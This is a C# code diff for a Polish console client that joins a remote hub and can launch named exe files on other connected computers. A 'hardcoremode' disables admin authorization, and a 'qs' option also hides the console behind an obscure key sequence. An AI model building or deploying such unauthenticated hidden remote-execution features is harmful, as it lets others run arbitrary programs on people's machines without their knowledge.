@@ -27,14 +27,6 @@ namespace DesktopClient
 
         static void Main(string[] args)
         {
-            var handle = GetConsoleWindow();
-
-            DaneAplikacji da = new DaneAplikacji();
-            var url = "http://remotenyancatopener.azurewebsites.net/";
-            var writer = Console.Out;
-            var hubClient = new HubClient(writer);
-            hubClient.RunAsync(url).Wait();
-
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("Bezprzewodowy Uruchamiacz NyanCata v1");
             Console.WriteLine("Aby zakonczyc wykonywanie komendy, wpisz 'exit'");
@@ -43,20 +35,39 @@ namespace DesktopClient
             Console.WriteLine("'startexe' - uruchom plik exe na innych komputerach (tych ktore zaakcpetuja cie jako admina)");
             Console.WriteLine("'beadmin' - zapytaj innych czy mozesz byc adminem");
             Console.WriteLine("'username' - zmien swoja nazwe");
-            Console.WriteLine("'hide' - ukryj konsole. F3+Escape - wyswietl ja ponownie");
+            Console.WriteLine("'hide' - ukryj konsole. DownArrow+Escape+Backspace - wyswietl ja ponownie");
             Console.WriteLine("'hardcoremode' - wylacz autoryzacje admina, kazdy moze uruchomic ci startexe");
+            Console.WriteLine("'qs' - quick setup - hardcoremode + hide");
             Console.ResetColor();
+
+            var handle = GetConsoleWindow();
+
+            DaneAplikacji da = new DaneAplikacji();
+            var url = "http://remotenyancatopener.azurewebsites.net/";
+            var writer = Console.Out;
+            var hubClient = new HubClient(writer);
+            hubClient.RunAsync(url).Wait();
 
             //string command = "";
             while (command != "exit")
             {
-                if (Console.ReadKey(true).Key == ConsoleKey.F3 && consoleHidden)
+                if (Console.ReadKey(true).Key == ConsoleKey.DownArrow && consoleHidden)
                 {
                     while (true)
                     {
                         if (Console.ReadKey(true).Key == ConsoleKey.Escape)
                         {
-                            ShowWindow(handle, SW_SHOW);
+                            while (true)
+                            {
+                                if (Console.ReadKey(true).Key == ConsoleKey.Backspace)
+                                {
+                                    ShowWindow(handle, SW_SHOW);
+                                }
+                                else
+                                {
+                                    break;
+                                }
+                            }
                         }
                         else
                         {
@@ -69,44 +80,41 @@ namespace DesktopClient
                 command = Console.ReadLine();
                 if (command == "chat")
                 {
-                    //Console.WriteLine("Wpisz wiadomosc do przeslania");
-
                     string text;
                     do
                     {
-                        //Console.Write("chat: ");
                         text = Console.ReadLine();
 
                         hubClient._hubProxy.Invoke("serverMessage", text);
                     }
                     while (text != "exit");
                 }
-                else if (command == "startexe")
+                if (command == "startexe")
                 {
                     Console.Write("Podaj nazwe pliku: ");
                     string path = Console.ReadLine();
                     hubClient._hubProxy.Invoke("openExeEverywhere", path);
                 }
-                else if (command == "beadmin")
+                if (command == "beadmin")
                 {
                     Console.WriteLine("Wyslano zapytanie");
                     hubClient._hubProxy.Invoke("askToBeAdmin");
                 }
-                else if (command == "username")
+                if (command == "username")
                 {
                     Console.Write("Podaj nowa nazwe uzytkownika: ");
                     string name = Console.ReadLine();
                     hubClient._hubProxy.Invoke("setNickname", name);
                     Console.WriteLine("Zapytanie wyslane, poczekaj na komunikat z serwera");
                 }
-                else if (command == "hide")
+                if (command == "hardcoremode" || command == "qs")
+                {
+                    DaneAplikacji.Admin = "admin";
+                }
+                if (command == "hide" || command == "qs")
                 {
                     ShowWindow(handle, SW_HIDE);
                     consoleHidden = true;
-                }
-                else if(command == "hardcoremode")
-                {
-                    DaneAplikacji.Admin = "admin";
                 }
             }
         }
